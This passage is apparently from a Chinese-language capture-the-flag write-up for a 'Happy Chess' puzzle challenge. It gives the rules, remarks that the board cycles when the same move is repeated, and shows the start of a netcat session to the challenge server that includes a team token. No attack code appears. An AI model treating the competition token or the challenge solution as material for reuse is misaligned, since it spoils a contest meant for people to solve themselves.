pieces horizontally <span class="hljs-keyword">and</span> vertically ~<br>Your goal is <span class="hljs-built_in">to</span> change all <span class="hljs-keyword">the</span> pieces <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same color ~<br>You will play <span class="hljs-number">10</span> rounds <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> game, <span class="hljs-keyword">and</span> you can <span class="hljs-built_in">get</span> <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">if</span> your total <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> moves is no more than <span class="hljs-number">239</span> ~<br>If you fail <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">round</span>, <span class="hljs-keyword">it</span> will be directly regarded <span class="hljs-keyword">as</span> <span class="hljs-keyword">using</span> <span class="hljs-number">240</span> steps :)<br>Have fun ~<br></code></pre></td></tr></table></figure><p>Sample input: [x] [y]，按照坐标移动，发现移动坐标一致时，棋盘会循环出现（和石头剪刀布那个逻辑很像），如此手搓十局之后，竟然就拿到了flag，很奇怪）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br></pre></td><td class="code"><pre><code class="hljs python">nc <span class="hljs-number">47.104</span><span class="hljs-number">.199</span><span class="hljs-number">.71</span> <span class="hljs-number">10075</span><br>Team Token:<br>&gt; icq1f53668cd7a8a6cd934da51b6ac0f<br>Welcome to Happy Chess!<br><br>The rule <span class="hljs-keyword">is</span> to select a piece <span class="hljs-keyword">and</span> flip <span class="hljs-built_in">all</span> the pieces horizontally <span class="hljs-keyword">and</span> vertically ~<br>Your goal <span class="hljs-keyword">is</span> to change <span class="hljs-built_in">all</span> the pieces to the same color ~<br>You will play <span class="hljs-number">10</span> rounds of the game, <span class="hljs-keyword">and</span> you can get the flag <span class="hljs-keyword">if</span> your total number of moves <span class="hljs-keyword">is</span> no more than <span class="hljs-number">239</span> ~<br>If you fail <span class="hljs-keyword">in</span> a <span class="hljs-built_in">round</span>, it will be directly regarded <span class="hljs-keyword">as</span> using <span class="hljs-number">240</span> steps 